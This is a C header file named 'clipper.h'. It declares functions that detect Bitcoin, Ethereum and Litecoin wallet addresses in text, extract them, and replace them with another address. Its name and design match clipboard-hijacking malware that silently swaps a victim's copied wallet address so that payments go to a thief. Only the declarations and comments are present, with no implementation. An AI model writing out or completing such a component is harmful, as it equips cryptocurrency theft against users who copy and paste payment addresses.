#ifndef CLIPPER_H
#define CLIPPER_H

#include <stddef.h>

/* Detect crypto address type in text.
 * Returns:
 *   1 = BTC address detected
 *   2 = ETH address detected
 *   3 = LTC address detected
 *   0 = no address detected
 */
int clipper_detect_address(const char *text);

/* Extract a crypto address from text.
 * Writes the detected address to `addr_buf` (up to `buflen` chars).
 * Returns:
 *   1 = BTC, 2 = ETH, 3 = LTC, 0 = none
 */
int clipper_extract_address(const char *text, char *addr_buf, size_t buflen);

/* Replace detected crypto address in original with replacement.
 * Writes result to `output` (up to `outlen` chars).
 * Returns 1 if replacement was made, 0 if no address found.
 */
int clipper_replace(const char *original, const char *replacement,
                    char *output, size_t outlen);

#endif
